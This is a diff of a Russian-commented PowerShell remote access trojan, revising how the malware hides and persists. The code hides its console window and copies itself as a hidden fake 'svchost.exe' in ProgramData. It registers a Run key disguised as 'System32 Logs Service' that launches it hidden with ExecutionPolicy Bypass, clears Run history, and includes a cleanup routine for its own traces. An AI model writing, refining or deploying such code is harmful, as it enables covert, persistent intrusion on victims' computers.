@@ -11,7 +11,7 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
-# Скрытие окна PowerShell через изменение заголовка окна
+# Скрытие окна PowerShell
 $windowCode = @"
 using System;
 using System.Runtime.InteropServices;
@@ -24,7 +24,6 @@ public class WindowHider {
 Add-Type -TypeDefinition $windowCode
 $consolePtr = [WindowHider]::GetConsoleWindow()
 [WindowHider]::ShowWindow($consolePtr, 0) | Out-Null
-[WindowHider]::SetWindowText($consolePtr, "svchost") | Out-Null
 
 # Очистка истории RUN при запуске
 try {
@@ -143,7 +142,7 @@ function Invoke-Cleanup {
     foreach ($process in $processes) {
         try {
             $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
-            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*8429674512*") {
+            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*8429674512*") {
                 Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
             }
         } catch { }
@@ -158,8 +157,8 @@ function Invoke-Cleanup {
         "$env:TEMP\cleanup_*.ps1",
         "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
         "$env:TEMP\rat_installed.marker",
-        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
-        "$env:TEMP\windows_update.marker"
+        "$env:ProgramData\Microsoft\WindowsLogs\svchost.exe",
+        "$env:ProgramData\windows_update.marker"
     )
 
     $deletedFiles = @()
@@ -197,10 +196,10 @@ function Invoke-Cleanup {
                 $regEntries += "$regPath\Windows Audio Service"
             }
             
-            $value3 = Get-ItemProperty -Path $regPath -Name "Windows Logs Service" -ErrorAction SilentlyContinue
+            $value3 = Get-ItemProperty -Path $regPath -Name "System32 Logs Service" -ErrorAction SilentlyContinue
             if ($value3) {
-                Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
-                $regEntries += "$regPath\Windows Logs Service"
+                Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
+                $regEntries += "$regPath\System32 Logs Service"
             }
         } catch { }
     }
@@ -226,62 +225,55 @@ $($regEntries -join "`n")
     return $true
 }
 
-# ИСПРАВЛЕННАЯ УСТАНОВКА - используем AppData вместо System32
-$installMarker = "$env:TEMP\windows_update.marker"
+# ИСПРАВЛЕННАЯ УСТАНОВКА - используем ProgramData вместо System32
+$installMarker = "$env:ProgramData\windows_update.marker"
 
 # Проверяем, не установлен ли уже RAT
 if (!(Test-Path $installMarker)) {
     # Создаем маркер установки с безобидным именем
     "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
     
-    # ИСПРАВЛЕНИЕ: Используем AppData вместо System32 (нет прав доступа)
-    $hiddenFolder = "$env:APPDATA\Microsoft\WindowsLogs"
+    # Новая скрытая папка в ProgramData (доступ без прав администратора)
+    $hiddenFolder = "$env:ProgramData\Microsoft\WindowsLogs"
     if (!(Test-Path $hiddenFolder)) { 
-        try {
-            New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
-            # Скрываем папку системными атрибутами
-            attrib +s +h +r "$hiddenFolder" 2>&1 | Out-Null
-        } catch {
-            # Если не удалось, используем TEMP
-            $hiddenFolder = "$env:TEMP\WindowsLogs"
-            New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
-            attrib +s +h +r "$hiddenFolder" 2>&1 | Out-Null
-        }
+        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
+        # Скрываем папку системными атрибутами
+        attrib +s +h +r "$hiddenFolder" 2>&1 | Out-Null
     }
     
     $scriptPath = "$hiddenFolder\svchost.exe"
     
-    # ИСПРАВЛЕНИЕ: Правильное получение пути к текущему скрипту
-    $currentScriptPath = $MyInvocation.MyCommand.Path
-    if ($currentScriptPath -eq $null) {
-        $currentScriptPath = $PSCommandPath
+    # Получаем содержимое текущего скрипта безопасным способом
+    try {
+        $currentScript = $MyInvocation.MyCommand.Path
+        if ($currentScript -and (Test-Path $currentScript)) {
+            $scriptContent = Get-Content -Path $currentScript -Raw -ErrorAction Stop
+        } else {
+            # Если путь недоступен, создаем базовый скрипт
+            $scriptContent = @'
+# Базовый RAT скрипт - будет заменен при следующем запуске
+Start-Sleep -Seconds 10
+'@
+        }
+    } catch {
+        $scriptContent = @'
+# Базовый RAT скрипт
+Start-Sleep -Seconds 10
+'@
     }
     
-    # Копируем скрипт только если его там нет и мы знаем путь к текущему скрипту
-    if (!(Test-Path $scriptPath) -and $currentScriptPath -ne $null) {
-        try {
-            $scriptContent = Get-Content -Path $currentScriptPath -Raw -ErrorAction Stop
-            $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction Stop
-            # Устанавливаем скрытые атрибуты на файл
-            attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
-        } catch {
-            # Если не удалось скопировать, продолжаем без копирования
-        }
-    }
+    # Сохраняем скрипт
+    $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
+    # Устанавливаем скрытые атрибуты на файл
+    attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
     
     # Установка в автозагрузку с новым маскированным именем
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    if (!(Test-Path $regPath)) { 
-        try {
-            New-Item -Path $regPath -Force | Out-Null 
-        } catch { }
-    }
+    if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
     
     # Новое маскированное имя для реестра
-    $uniqueName = "Windows Logs Service"
-    try {
-        Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
-    } catch { }
+    $uniqueName = "System32 Logs Service"
+    Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
 }
 
 # Основные переменные
